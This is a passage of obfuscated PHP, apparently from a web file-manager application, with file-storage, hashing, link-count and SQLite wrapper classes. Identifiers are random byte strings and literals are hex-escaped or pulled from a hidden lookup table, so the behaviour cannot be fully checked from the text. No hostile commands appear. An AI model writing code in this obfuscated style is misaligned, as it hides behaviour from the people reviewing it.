$this->_listData($ş¡®ş¶ì); } private function _listData($Êö—ºŞà) { $¸ÊËÌì˜ =& $_SERVER[³Ôà×Ó]; $Û‰Ğ…„ü = $this->where($Êö—ºŞà)->_makeOrder()->selectPage(100); $this->_listAppendParent($Û‰Ğ…„ü[$¸ÊËÌì˜[454]]); $this->_listAppendUser($Û‰Ğ…„ü[$¸ÊËÌì˜[454]]); $this->_listAppendMeta($Û‰Ğ…„ü[$¸ÊËÌì˜[454]]); return $Û‰Ğ…„ü; } private function _makeOrder() { $ª¿–Àó =& $_SERVER[³Ôà×Ó]; $‹¶ÒŸ’ş = array($ª¿–Àó[1995], $ª¿–Àó[1994], $ª¿–Àó[231]); $üâœİÔø = Input::get($ª¿–Àó[539], $ª¿–Àó[7], $ª¿–Àó[506], $‹¶ÒŸ’ş); $àèÄ ÅÓ = Input::get($ª¿–Àó[540], $ª¿–Àó[7], $ª¿–Àó[1758], array($ª¿–Àó[2009], $ª¿–Àó[535])); $•³×ö§¾ = $üâœİÔø . $ª¿–Àó[53] . $àèÄ ÅÓ; return $this->order($•³×ö§¾); } private function _listAppendParent(&$ã³–Ã”è) { $‰Î§ğ©¿ =& $_SERVER[³Ôà×Ó]; $¹î¥ŞÓ‡ = array_unique(array_to_keyvalue($ã³–Ã”è, $‰Î§ğ©¿[12], $‰Î§ğ©¿[1992])); $¹î¥ŞÓ‡ = array_remove_value($¹î¥ŞÓ‡, $‰Î§ğ©¿[228]); if (!$¹î¥ŞÓ‡) { return; } $ó®â›± = $this->where(array($‰Î§ğ©¿[1993] => array($‰Î§ğ©¿[7], $¹î¥ŞÓ‡)))->select(); $ó®â›± = array_to_keyvalue($ó®â›±, $‰Î§ğ©¿[2000]); foreach ($ã³–Ã”è as &$‹Éµ†ç) { if (isset($ó®â›±[$‹Éµ†ç[$‰Î§ğ©¿[1992]]])) { $‹Éµ†ç[$‰Î§ğ©¿[2010]] = $ó®â›±[$‹Éµ†ç[$‰Î§ğ©¿[1992]]]; } } unset($‹Éµ†ç); } private function _listAppendUser(&$¯ÌÃÊ¼‘) { $»šÓƒş =& $_SERVER[³Ôà×Ó]; $İÈÚ¥Ÿ¾ = array_unique(array_to_keyvalue($¯ÌÃÊ¼‘, $»šÓƒş[12], $»šÓƒş[1765])); $İÈÚ¥Ÿ¾ = array_remove_value($İÈÚ¥Ÿ¾, $»šÓƒş[228]); if (count($İÈÚ¥Ÿ¾) == 0) { return; } foreach ($¯ÌÃÊ¼‘ as $®ÂïİúØ) { if (isset($®ÂïİúØ[$»šÓƒş[2010]])) { $İÈÚ¥Ÿ¾[] = $®ÂïİúØ[$»šÓƒş[2010]][$»šÓƒş[1765]]; } } $¯åÑ«Ğ¿ = Model($»šÓƒş[607])->userListInfo($İÈÚ¥Ÿ¾); foreach ($¯ÌÃÊ¼‘ as &$®ÂïİúØ) { $®ÂïİúØ[$»šÓƒş[671]] = $¯åÑ«Ğ¿[$®ÂïİúØ[$»šÓƒş[1765]]]; if (isset($®ÂïİúØ[$»šÓƒş[2010]])) { $®ÂïİúØ[$»šÓƒş[2010]][$»šÓƒş[671]] = $¯åÑ«Ğ¿[$®ÂïİúØ[$»šÓƒş[2010]][$»šÓƒş[1765]]]; } } unset($®ÂïİúØ); } private function _listAppendMeta(&$×î¦Ş–Œ) { $´…Á¬Å =& $_SERVER[³Ôà×Ó]; $ÌìÈ‹÷ô = array_unique(array_to_keyvalue($×î¦Ş–Œ, $´…Á¬Å[12], $´…Á¬Å[2000])); $ÌìÈ‹÷ô = array_remove_value($ÌìÈ‹÷ô, $´…Á¬Å[228]); if (!$ÌìÈ‹÷ô) { return; } foreach ($×î¦Ş–Œ as $÷®îŸÔ) { if (isset($÷®îŸÔ[$´…Á¬Å[2010]])) { $ÌìÈ‹÷ô[] = $÷®îŸÔ[$´…Á¬Å[2010]][$´…Á¬Å[2000]]; } } $¾Ø…¥´ = $this->metaList($ÌìÈ‹÷ô); if (!$¾Ø…¥´) { return !1; } foreach ($×î¦Ş–Œ as &$÷®îŸÔ) { $÷®îŸÔ[$´…Á¬Å[548]] = $¾Ø…¥´[$÷®îŸÔ[$´…Á¬Å[2000]]]; if (isset($÷®îŸÔ[$´…Á¬Å[2010]])) { $÷®îŸÔ[$´…Á¬Å[2010]][$´…Á¬Å[548]] = $¾Ø…¥´[$÷®îŸÔ[$´…Á¬Å[2010]][$´…Á¬Å[2000]]]; } } unset($÷®îŸÔ); } private function metaList($¨ş¦»¬’) { $¬éàœö =& $_SERVER[³Ôà×Ó]; if (!$¨ş¦»¬’) { return array(); } $‘ëĞ”œ = array($¬éàœö[2000] => array($¬éàœö[7], $¨ş¦»¬’)); $´‚®©şÆ = Model($¬éàœö[2011])->where($‘ëĞ”œ)->select(); $´‚®©şÆ = array_to_keyvalue_group($´‚®©şÆ, $¬éàœö[2000]); foreach ($´‚®©şÆ as $ÒŠÊ¼Š => $ÚÎ©œÔ) { $½õ‰áøó = array(); foreach ($ÚÎ©œÔ as $¦€¤®Ã) { $½õ‰áøó[$¦€¤®Ã[$¬éàœö[97]]] = $¦€¤®Ã[$¬éàœö[459]]; } $´‚®©şÆ[$ÒŠÊ¼Š] = $½õ‰áøó; } return $´‚®©şÆ ? $´‚®©şÆ : array(); } public function removeTarget($¶„å›, $à àÄ) { $™ï§¤â =& $_SERVER[³Ôà×Ó]; if (!$à àÄ) { return !0; } $à àÄ = is_array($à àÄ) ? $à àÄ : array($à àÄ); $¾ÎıÚÙ = array($™ï§¤â[190] => $¶„å›, $™ï§¤â[578] => array($™ï§¤â[7], $à àÄ)); $—ìùÙ‘² = $this->field($™ï§¤â[2000])->where($¾ÎıÚÙ)->select(); $ÂÀ•çòÈ = array_to_keyvalue($—ìùÙ‘², $™ï§¤â[12], $™ï§¤â[2000]); if (!$ÂÀ•çòÈ) { return !0; } $¾ÎıÚÙ = array($™ï§¤â[2000] => array($™ï§¤â[7], $ÂÀ•çòÈ)); $this->where($¾ÎıÚÙ)->delete(); Model($™ï§¤â[2003])->where($¾ÎıÚÙ)->delete(); Model($™ï§¤â[2012])->where($¾ÎıÚÙ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65\137\x63\x6f\x6e\164\x65\x6e\164\x73"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\x54\x69\155\x65", "\x74\151\155\x65", "\x69\156\x73\x65\x72\164", "\x66\165\x6e\x63\164\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\154\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\155\x65" => "\x69\157\x5f\146\151\x6c\145\137\155\145\164\x61", "\x6d\145\164\x61\106\151\x65\154\144" => "\x66\x69\x6c\x65\111\x44"); public function fileInfo($ğÎæÄ‰) { $¨üî£îÏ =& $_SERVER[³Ôà×Ó]; static $ú·¹±ğ¿ = array(); if (!isset($ú·¹±ğ¿[$ğÎæÄ‰])) { $‡àÑÑ¬Î = $¨üî£îÏ[2013]; $ÊÕıêÛ = Model($¨üî£îÏ[553])->field($‡àÑÑ¬Î)->where(array($¨üî£îÏ[551] => $ğÎæÄ‰))->find(); $ú·¹±ğ¿[$ğÎæÄ‰] = $ÊÕıêÛ; } return $ú·¹±ğ¿[$ğÎæÄ‰]; } public function addFileByContent($‚çËÑ–ä = '', $‰«³›‚É = '') { $¬Æ¤ŒïÍ =& $_SERVER[³Ôà×Ó]; $Ÿ¶Ê’®û = TEMP_PATH . $¬Æ¤ŒïÍ[2014]; if (!is_dir($Ÿ¶Ê’®û)) { mk_dir($Ÿ¶Ê’®û); } $Àñ ÌŒ™ = $Ÿ¶Ê’®û . $¬Æ¤ŒïÍ[2015] . rand_string(16); file_put_contents($Àñ ÌŒ™, $‚çËÑ–ä); $ş—Åøâ = $this->addFile($Àñ ÌŒ™, $‰«³›‚É, !0); if (file_exists($Àñ ÌŒ™)) { @unlink($Àñ ÌŒ™); } return $ş—Åøâ; } public function createFileName($¸Ç’¹”Ç, $İÉŒ–¿£ = false, $€ÜË¨Ì = false) { $±¡•˜“Œ =& $_SERVER[³Ôà×Ó]; $Ñ¶ºŸãÙ = IO::init($±¡•˜“Œ[8]); $öûÇ–“Õ = $this->makeFilePath($¸Ç’¹”Ç, $Ñ¶ºŸãÙ, $İÉŒ–¿£, $€ÜË¨Ì); $º¬÷òœâ = $Ñ¶ºŸãÙ->pathFather($öûÇ–“Õ); static $šÁÈäìØ = false; $ÕÍŞ¼¨ = $±¡•˜“Œ[2016] . md5($º¬÷òœâ); if (!$šÁÈäìØ && !Cache::get($ÕÍŞ¼¨)) { $šÁÈäìØ = !0; $ŞÇŸóï‘ = IO::mkdir($º¬÷òœâ); if (!IO::exist($ŞÇŸóï‘ . $±¡•˜“Œ[872])) { IO::mkfile($ŞÇŸóï‘ . $±¡•˜“Œ[872]); } Cache::set($ÕÍŞ¼¨, 1, 3600 * 2); } return $öûÇ–“Õ; } public function makeFilePath($ œÄö—÷, $†Ãøò¸, $ÚÀî·šå = false, $ä…©·¨õ = false) { $ğÛæËÎÓ =& $_SERVER[³Ôà×Ó]; $èÙ—£§ = Model($ğÛæËÎÓ[845])->get($ğÛæËÎÓ[2017]); $¡¥ˆ˜œ¥ = KodIO::defaultIO() . date($ğÛæËÎÓ[2018]); $ïëÂöá… = $¡¥ˆ˜œ¥ . rand_string(5) . short_id(100); $ œÄö—÷ = str_replace($ğÛæËÎÓ[8], $ğÛæËÎÓ[11], KodIO::clear($ œÄö—÷)); $„€îàÌ’ = $†Ãøò¸->ext($ œÄö—÷); if (!$ œÄö—÷) { $èÙ—£§ = $ğÛæËÎÓ[851]; } switch ($èÙ—£§) { case $ğÛæËÎÓ[2019]: if ($„€îàÌ’) { $ïëÂöá… = $ïëÂöá… . $ğÛæËÎÓ[10] . $„€îàÌ’; } if ($„€îàÌ’ == $ğÛæËÎÓ[1956]) { $ïëÂöá… .= $ğÛæËÎÓ[1288]; } break; case $ğÛæËÎÓ[2020]: $¦í¼ú‹¬ = Model($ğÛæËÎÓ[845])->get($ğÛæËÎÓ[846]); $×‘æˆ¥Ñ = substr(md5($ğÛæËÎÓ[847] . $¦í¼ú‹¬ . date($ğÛæËÎÓ[824])), 0, 8); $‹ôªƒÊ¬ = KodIO::defaultDriver(); $¡¥ˆ˜œ¥ = $ğÛæËÎÓ[1319] . $‹ôªƒÊ¬[$ğÛæËÎÓ[484]] . $ğÛæËÎÓ[493] . date($ğÛæËÎÓ[2021]) . $×‘æˆ¥Ñ . $ğÛæËÎÓ[8]; if ($„€îàÌ’ == $ğÛæËÎÓ[1956]) { $ œÄö—÷ .= $ğÛæËÎÓ[1288]; } $Û€ı•Ö€ = $ğÛæËÎÓ[2022] . $¡¥ˆ˜œ¥ . $ œÄö—÷; CacheLock::lock($Û€ı•Ö€); $ïëÂöá… = $¡¥ˆ˜œ¥ . $ œÄö—÷; if (IO::exist($¡¥ˆ˜œ¥ . $ œÄö—÷)) { $Õ˜§ÁÅ‹ = substr($ œÄö—÷, 0, strlen($ œÄö—÷) - strlen($„€îàÌ’)); $ƒÆãÆÃ¶ = $ä…©·¨õ ? substr($ä…©·¨õ, 0, 5) : ($ÚÀî·šå ? substr($ÚÀî·šå, 0, 5) : rand_string(5)); $ïëÂöá… = $¡¥ˆ˜œ¥ . $Õ˜§ÁÅ‹ . $ƒÆãÆÃ¶; if ($„€îàÌ’) { $ïëÂöá… = $ïëÂöá… . $ğÛæËÎÓ[10] . $„€îàÌ’; } } if (IO::isOsDriver($ïëÂöá…) && !IO::isUploadServer($ïëÂöá…)) { if (IO::exist($ïëÂöá…)) { return $ïëÂöá…; } $’´ë«‚ = IO::setContent($ïëÂöá…, $ğÛæËÎÓ[12]); if (!$’´ë«‚) { show_json($ğÛæËÎÓ[2023], !1); } } CacheLock::unlock($Û€ı•Ö€); break; case $ğÛæËÎÓ[851]: break; default: break; } return $ïëÂöá…; } public function addFileByRemote($æë Úõ, $æöØ¼Ì¾, $‚Ò§ĞäÙ = array()) { $å”ğÈ¶û =& $_SERVER[³Ôà×Ó]; if (!IO::exist($æë Úõ)) { return !1; } $ÙÕóÇÃ = $‚Ò§ĞäÙ[$å”ğÈ¶û[556]] ? $‚Ò§ĞäÙ[$å”ğÈ¶û[556]] : $å”ğÈ¶û[12]; $ÉÕ–êÌÙ = IO::hashMd5($æë Úõ, $ÙÕóÇÃ); $×‘±Ø– = KodIO::defaultDriver(); $Ü¿ü“”Í = array($å”ğÈ¶û[626] => IO::size($æë Úõ), $å”ğÈ¶û[2024] => 1, $å”ğÈ¶û[503] => $æöØ¼Ì¾, $å”ğÈ¶û[883] => $×‘±Ø–[$å”ğÈ¶û[484]], $å”ğÈ¶û[504] => $æë Úõ, $å”ğÈ¶û[2025] => $‚Ò§ĞäÙ[$å”ğÈ¶û[681]] ? $‚Ò§ĞäÙ[$å”ğÈ¶û[681]] : IO::hashSimple($æë Úõ), $å”ğÈ¶û[2026] => $ÉÕ–êÌÙ ? $ÉÕ–êÌÙ : $ÙÕóÇÃ); if ($Òô¿Š = $this->addFileCheckExist($Ü¿ü“”Í[$å”ğÈ¶û[681]], $Ü¿ü“”Í[$å”ğÈ¶û[556]], $Ü¿ü“”Í[$å”ğÈ¶û[79]])) { return $Òô¿Š; } return $this->addFileData($Ü¿ü“”Í); } private function addFileData($ô–´“¢ˆ) { $Ûú´åÖä =& $_SERVER[³Ôà×Ó]; if (!$ô–´“¢ˆ) { return !1; } $ô–´“¢ˆ[$Ûú´åÖä[79]] = intval($ô–´“¢ˆ[$Ûú´åÖä[79]]); if (!$ô–´“¢ˆ[$Ûú´åÖä[79]] && strlen($ô–´“¢ˆ[$Ûú´åÖä[681]]) > 32) { $ô–´“¢ˆ[$Ûú´åÖä[79]] = intval(substr($ô–´“¢ˆ[$Ûú´åÖä[681]], 32)); } $´†àéÕ = $this->add($ô–´“¢ˆ); return $this->find($´†àéÕ); } public function addFile($™–¬éÎö, $¶àÛî, $ÂÕõ×ÊÖ = false) { $ä´ÊØÉû =& $_SERVER[³Ôà×Ó]; $ƒäÈó¦ = IO::hashSimple($™–¬éÎö); $ò±·ĞÓŞ = IO::size($™–¬éÎö); $ï‰ÀÍã¯ = $ò±·ĞÓŞ <= 1024 * 1024 * 10 ? IO::hashMd5($™–¬éÎö) : $ä´ÊØÉû[12]; $ş©º—„ø = $ä´ÊØÉû[2027] . $ƒäÈó¦; CacheLock::lock($ş©º—„ø); if ($ï‰ÀÍã¯ && $ƒäÈó¦) { $ş·íŒæÛ = $this->addFileCheckExist($ƒäÈó¦, $ï‰ÀÍã¯, $ò±·ĞÓŞ); if ($ş·íŒæÛ) { CacheLock::unlock($ş©º—„ø); return $ş·íŒæÛ; } } $ğ‹‘‘Õˆ = $this->addFileMake($™–¬éÎö, $ò±·ĞÓŞ, $ƒäÈó¦, $ï‰ÀÍã¯, $¶àÛî, $ÂÕõ×ÊÖ); $ï¡©¸±‘ = $this->addFileData($ğ‹‘‘Õˆ); CacheLock::unlock($ş©º—„ø); if (!$ï‰ÀÍã¯ && $ï¡©¸±‘) { $this->fileMd5Check($ï¡©¸±‘); } return $ï¡©¸±‘; } public function fileMd5Check($ã³™îª†) { $½¿š¡¥Ä =& $_SERVER[³Ôà×Ó]; $èÏñ‰ì˜ = array($ã³™îª†[$½¿š¡¥Ä[550]], $ã³™îª†[$½¿š¡¥Ä[87]]); $Êî‚áƒÎ = $½¿š¡¥Ä[2028] . $ã³™îª†[$½¿š¡¥Ä[87]]; $Ü Üè´ı = $½¿š¡¥Ä[2029] . $ã³™îª†[$½¿š¡¥Ä[550]]; TaskQueue::add($½¿š¡¥Ä[2030], $èÏñ‰ì˜, $Êî‚áƒÎ, $Ü Üè´ı); } public function fileMd5Set($”±ëè°…, $ô«„Û‰ä) { $ùÇàá®¯ =& $_SERVER[³Ôà×Ó]; $ùà şœÏ = $this->find($”±ëè°…); if (!$ùà şœÏ || $ùà şœÏ[$ùÇàá®¯[556]]) { return; } $©œÇ¬ ¬ = IO::hashMd5($ô«„Û‰ä); if (!$©œÇ¬ ¬) { return $ùÇàá®¯[12]; } $this->where(array($ùÇàá®¯[550] => $”±ëè°…))->save(array($ùÇàá®¯[556] => $©œÇ¬ ¬)); } public function addFileMake($‚à–÷´§, $‡¼”£¨, $Æ‡ªóë, $îˆçœİè, $ÜÏ‘†•, $¹Õ¿ÇŞ) { $™›ÎçÀ =& $_SERVER[³Ôà×Ó]; $½©ú“ÃÑ = $this->createFileName($ÜÏ‘†•, $Æ‡ªóë, $îˆçœİè); $‚ùÈÌ½§ = get_path_father($½©ú“ÃÑ); $ŸƒƒÏ° = get_path_this($½©ú“ÃÑ); if ($¹Õ¿ÇŞ) { $‘Ù Ô¶Š = IO::move($‚à–÷´§, $‚ùÈÌ½§, !1, $ŸƒƒÏ°); } else { $‘Ù Ô¶Š = IO::copy($‚à–÷´§, $‚ùÈÌ½§, !1, $ŸƒƒÏ°); } if (!$‘Ù Ô¶Š) { return !1; } $«ä•»° = KodIO::defaultDriver(); $’Ø”öà = array($™›ÎçÀ[626] => $‡¼”£¨, $™›ÎçÀ[2024] => 1, $™›ÎçÀ[503] => $ÜÏ‘†•, $™›ÎçÀ[883] => $«ä•»°[$™›ÎçÀ[484]], $™›ÎçÀ[504] => $½©ú“ÃÑ, $™›ÎçÀ[2025] => $Æ‡ªóë, $™›ÎçÀ[2026] => $îˆçœİè); return $’Ø”öà; } public function addFileCheckExist($Î»Û‘¬, $›‚¬õ, $³ª£øğè) { $èë…²ªß =& $_SERVER[³Ôà×Ó]; $Öí×ÎÚö = $this->findByHash($Î»Û‘¬, $›‚¬õ); if (!$Öí×ÎÚö) { return !1; } $è©´ËîŠ = array($èë…²ªß[2024] => intval($Öí×ÎÚö[$èë…²ªß[2031]]) + 1, $èë…²ªß[626] => $³ª£øğè); $this->where(array($èë…²ªß[551] => $Öí×ÎÚö[$èë…²ªß[550]]))->save($è©´ËîŠ); return $Öí×ÎÚö; } public function remove($ˆËşòµÆ) { $this->linkCountChange($ˆËşòµÆ, !1); $this->clearEmpty(); return !0; } public function linkAdd($¬ıöŞ”) { $this->linkCountChange($¬ıöŞ”, !0); } public function linkCountChange($ØöôÉïİ, $·Õ¶ì) { $Ÿ±ğ™ÙÆ =& $_SERVER[³Ôà×Ó]; if (!$ØöôÉïİ) { return; } if (!is_array($ØöôÉïİ)) { $ØöôÉïİ = array($ØöôÉïİ); } $âôú¿—í = array(); foreach ($ØöôÉïİ as $áú‰ŒÀ‘) { $Çñ·×º¾ = $áú‰ŒÀ‘ . $Ÿ±ğ™ÙÆ[12]; if (!$âôú¿—í[$Çñ·×º¾]) { $âôú¿—í[$Çñ·×º¾] = 0; } $âôú¿—í[$Çñ·×º¾]++; } $ñûº¼Ûõ = array(); foreach ($âôú¿—í as $áú‰ŒÀ‘ => $— ¥€ûÙ) { $Çñ·×º¾ = $— ¥€ûÙ . $Ÿ±ğ™ÙÆ[12]; if (!$ñûº¼Ûõ[$Çñ·×º¾]) { $ñûº¼Ûõ[$Çñ·×º¾] = array(); } $ñûº¼Ûõ[$Çñ·×º¾][] = $áú‰ŒÀ‘; } foreach ($ñûº¼Ûõ as $— ¥€ûÙ => $ñü¡ó¶ó) { if (!$ñü¡ó¶ó) { continue; } $— ¥€ûÙ = $·Õ¶ì ? $— ¥€ûÙ : -intval($— ¥€ûÙ); $ŸÊøà‹— = array($Ÿ±ğ™ÙÆ[550] => array($Ÿ±ğ™ÙÆ[7], $ñü¡ó¶ó)); if ($— ¥€ûÙ < 0) { $ŸÊøà‹—[$Ÿ±ğ™ÙÆ[2031]] = array($Ÿ±ğ™ÙÆ[1090], abs($— ¥€ûÙ)); } $this->where($ŸÊøà‹—)->setAdd($Ÿ±ğ™ÙÆ[2031], $— ¥€ûÙ); } } public function findByHash($³Ôò³è, $‡…èĞ×× = false) { $â’àÓÈÁ =& $_SERVER[³Ôà×Ó]; if (!$³Ôò³è && !$‡…èĞ××) { return !1; } $Î¤£«˜¸ = array($â’àÓÈÁ[2025] => $³Ôò³è); if ($‡…èĞ××) { $Î¤£«˜¸ = array($â’àÓÈÁ[2026] => $‡…èĞ××); } return $this->order($â’àÓÈÁ[2032])->where($Î¤£«˜¸)->find(); } public function clearEmpty($â¾Æ©£ª = 0) { $†±±İ =& $_SERVER[³Ôà×Ó]; $ŸÛ€¸¢ = time() - 3600 * 24 * $â¾Æ©£ª; $áëûÅ² = $†±±İ[2033] . $ŸÛ€¸¢; $ÇŞµëàÜ = $this->where($áëûÅ²)->select(); if (!$ÇŞµëàÜ) { return; } $û½ÇêÉï = new Task($†±±İ[2034], $†±±İ[12], count($ÇŞµëàÜ)); foreach ($ÇŞµëàÜ as $²ı¯±¶) { $û½ÇêÉï->update(1); $this->resetFile($²ı¯±¶); } $û½ÇêÉï->end(); } public function resetFile($Ï×”÷Ä¿) { $¸’™åŞ  =& $_SERVER[³Ôà×Ó]; $¨Ù¨ë¿ = array($¸’™åŞ [551] => $Ï×”÷Ä¿[$¸’™åŞ [550]]); $‰êïì¾Ä = Model($¸’™åŞ [1414])->where($¨Ù¨ë¿)->count(); $¤ÚÅÛÆ÷ = Model($¸’™åŞ [2035])->where($¨Ù¨ë¿)->count(); $èìé¤±• = intval($‰êïì¾Ä) + intval($¤ÚÅÛÆ÷); if ($èìé¤±• == 0) { IO::remove($Ï×”÷Ä¿[$¸’™åŞ [87]]); Model($¸’™åŞ [2036])->delete($Ï×”÷Ä¿[$¸’™åŞ [550]]); $this->where($¨Ù¨ë¿)->delete(); $this->metaSet($Ï×”÷Ä¿[$¸’™åŞ [550]], null, null); write_log(ACTION . $¸’™åŞ [2037] . KodUser::id() . $¸’™åŞ [2038] . $Ï×”÷Ä¿[$¸’™åŞ [550]] . $¸’™åŞ [2039] . $Ï×”÷Ä¿[$¸’™åŞ [79]] . $¸’™åŞ [201] . $Ï×”÷Ä¿[$¸’™åŞ [87]], $¸’™åŞ [2040]); return; } if ($Ï×”÷Ä¿[$¸’™åŞ [2031]] != $èìé¤±•) { $this->where($¨Ù¨ë¿)->save(array($¸’™åŞ [2024] => $èìé¤±•)); } } public function storageInfo($¨èÆ»¢ = false) { $Ã«„ü— =& $_SERVER[³Ôà×Ó]; $ãß¬àÛ = $this->count() + 0.0; $Í²­¿êˆ = 0; $ˆÓØÊ‚¹ = 1; $¥¹ĞË×å = 0; $ÓÎ¸•ó¤ = 5000; for ($Äàê¾ˆ• = 0; $Äàê¾ˆ• < $ãß¬àÛ; $Äàê¾ˆ• = $Äàê¾ˆ• + $ÓÎ¸•ó¤) { $…‹°Ñ³ = $this->limit($Äàê¾ˆ•, $Äàê¾ˆ• + $ÓÎ¸•ó¤)->select(); foreach ($…‹°Ñ³ as $Î„™¯„Ã) { $ˆÓØÊ‚¹ += $Î„™¯„Ã[$Ã«„ü—[79]] * $Î„™¯„Ã[$Ã«„ü—[2031]]; $Í²­¿êˆ += $Î„™¯„Ã[$Ã«„ü—[79]] * ($Î„™¯„Ã[$Ã«„ü—[2031]] - 1); $¥¹ĞË×å += $Î„™¯„Ã[$Ã«„ü—[2031]]; } } $çŞ§À¸ø = array($Ã«„ü—[2041] => $ˆÓØÊ‚¹, $Ã«„ü—[2042] => $Í²­¿êˆ, $Ã«„ü—[2043] => $Í²­¿êˆ / $ˆÓØÊ‚¹, $Ã«„ü—[83] => $ãß¬àÛ, $Ã«„ü—[2044] => $¥¹ĞË×å); return $çŞ§À¸ø; } } goto aÑ…˜ìåğ; dÈ‘Š‰‘İ’: class DbSqlite extends DbSqliteBase { public function query($¢·«ì÷») { $÷÷Û¦ñû =& $_SERVER[³Ôà×Ó]; if (!CacheLock::fileLock($÷÷Û¦ñû[13])) { return !1; } $Ø‘ßşëµ = parent::query($¢·«ì÷»); CacheLock::fileUnLock($÷÷Û¦ñû[13]); return $Ø‘ßşëµ; } public function execute($ŒÙ¦Ùêã) { $ã­Â‰’İ =& $_SERVER[³Ôà×Ó]; if (!CacheLock::fileLock($ã­Â‰’İ[13])) { return !1; } $º³º¢¾Œ = parent::execute($ŒÙ¦Ùêã); CacheLock::fileUnLock($ã­Â‰’İ[13]); return $º³º¢¾Œ; } } class DbSqlite3 extends DbSqlite3Base { public function query($¯õÕí™ì) { $Ü†Ìº¿ =& $_SERVER[³Ôà×Ó]; if (!CacheLock::fileLock($Ü†Ìº¿[13])) { return !1; } $¯ë‚—Î× = parent::query($¯õÕí™ì); CacheLock::fileUnLock($Ü†Ìº¿[13]); return $¯ë‚—Î×; } public function execute($¸¨å•ıš) { $“¢Á„©¥ =& $_SERVER[³Ôà×Ó]; if (!CacheLock::fileLock($“¢Á„©¥[13])) { return !1; } $—»Êñ½Ù = parent::execute($¸¨å•ıš); CacheLock::fileUnLock($“¢Á„©¥[13]); return $—»Êñ½Ù; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\x71" => "\x3c\x3e", "\147\164" => "\x3e", "\145\x67\164" => "\76\75", "\x6c\164" => "\x3c", "\x65\154\164" => "\x3c\x3d", "\x6e\157\x74\154\x69\x6b\x65" => "\116\117\x54\40\x4c\x49\x4b\105", "\154\x69\x6b\x65" => "\x4c\x49\x4b\105", "\x69\156" => "\111\116", "\156\157\x74\x69\x6e" => "\x4e\x4f\x54\40\111\116", "\x6e\x6f\x74\40\151\x6e" => "\116\117\x54\x20\x49\116", "\x62\145\x74\167\145\x65\x6e" => "\x42\105\124\x57\x45\x45\116", "\x6e\x6f\164\142\145\164\167\145\x65\x6e" => "\x4e\117\124\40\x42\x45\124\x57\x45\x45\116", "\x6e\x6f\164\40\142\145\x74\167\145\x65\156" => "\x4e\x4f\x54\40\x42\105\124\x57\105\x45\x4e"); protected $selectSql = "\123\x45\x4c\x45\x43\124\45\104\111\x53\124\x49\116\x43\124\x25\40\x25\106\x49\x45\x4c\x44\45\x20\106\x52\x4f\x4d\40\x25\x54\101\102\114\105\x25\x25\112\x4f\111\x4e\x25\x25\127\x48\x45\x52\x45\45\x25\x47\122\x4f\125\120\45\x25\x48\101\x56\111\x4e\x47\x25\45\x4f\x52\104\x45\122\45\45\114\x49\115\111\x54\x25\40\x25\125\116\111\117\116\45\x25\x43\x4f\115\x4d\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $×Ï¾ÎŞ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[³Ôà×Ó][1035], $×Ï¾ÎŞ); } public function factory($¸¹ş£÷ = '') { $ñÜÚî¿¥ =& $_SERVER[³Ôà×Ó]; $¸¹ş£÷ = $this->parseConfig($¸¹ş£÷); if (empty($¸¹ş£÷[$ñÜÚî¿¥[1036]])) { think_exception(think_lang($ñÜÚî¿¥[1037])); } $this->dbType = ucwords(strtolower($¸¹ş£÷[$ñÜÚî¿¥[1036]])); $©Ô£É¹ø = $ñÜÚî¿¥[1038] . $this->dbType; if (class_exists($©Ô£É¹ø)) { $¾Åºˆ®Î = new $©Ô£É¹ø($¸¹ş£÷); if ($ñÜÚî¿¥[1039] != strtolower($¸¹ş£÷[$ñÜÚî¿¥[1036]])) { $¾Åºˆ®Î->dbType = strtoupper($this->dbType); } else { $¾Åºˆ®Î->dbType = $this->_getDsnType($¸¹ş£÷[$ñÜÚî¿¥[991]]); } } else { think_exception(think_lang($ñÜÚî¿¥[1040]) . $ñÜÚî¿¥[1041] . $©Ô£É¹ø); } return $¾Åºˆ®Î; } public function __call($à™”ûº, $ÁÏîİúì) { if (method_exists($this, $à™”ûº)) { return call_user_func_array(array($this, $à™”ûº), $ÁÏîİúì); } } protected function _getDsnType($º‘Ö¥é) { $•÷½÷°‹ = explode($_SERVER[³Ôà×Ó][4], $º‘Ö¥é); $§¦ş³œà = strtoupper(trim($•÷½÷°‹[0])); return $§¦ş³œà; } private function parseConfig($äÒíßô = '') { $¢õ’ºü =& $_SERVER[³Ôà×Ó]; if (!empty($äÒíßô) && is_string($äÒíßô)) { $äÒíßô = $this->parseDSN($äÒíßô); } elseif (is_array($äÒíßô)) { $äÒíßô = array_change_key_case($äÒíßô); $äÒíßô = array($¢õ’ºü[1036] => $äÒíßô[$¢õ’ºü[1042]], $¢õ’ºü[963] => $äÒíßô[$¢õ’ºü[1043]], $¢õ’ºü[964] => $äÒíßô[$¢õ’ºü[1044]], $¢õ’ºü[961] => $äÒíßô[$¢õ’ºü[1045]], $¢õ’ºü[962] => $äÒíßô[$¢õ’ºü[1046]], $¢õ’ºü[21] => $äÒíßô[$¢õ’ºü[1047]], $¢õ’ºü[991] => $äÒíßô[$¢õ’ºü[1048]], $¢õ’ºü[17] => isset($äÒíßô[$¢õ’ºü[1049]]) ? $äÒíßô[$¢õ’ºü[1049]] : array()); } elseif (empty($äÒíßô)) { if (think_config($¢õ’ºü[1050]) && $¢õ’ºü[1039] != strtolower(think_config($¢õ’ºü[1051]))) { $äÒíßô = $this->parseDSN(think_config($¢õ’ºü[1050])); } else { $äÒíßô = array($¢õ’ºü[1036] => think_config($¢õ’ºü[1051]), $¢õ’ºü[963] => think_config($¢õ’ºü[1052]), $¢õ’ºü[964] => think_config($¢õ’ºü[1053]), $¢õ’ºü[961] => think_config($¢õ’ºü[1054]), $¢õ’ºü[962] => think_config($¢õ’ºü[1055]), $¢õ’ºü[21] => think_config($¢õ’ºü[323]), $¢õ’ºü[991] => think_config($¢õ’ºü[1050]), 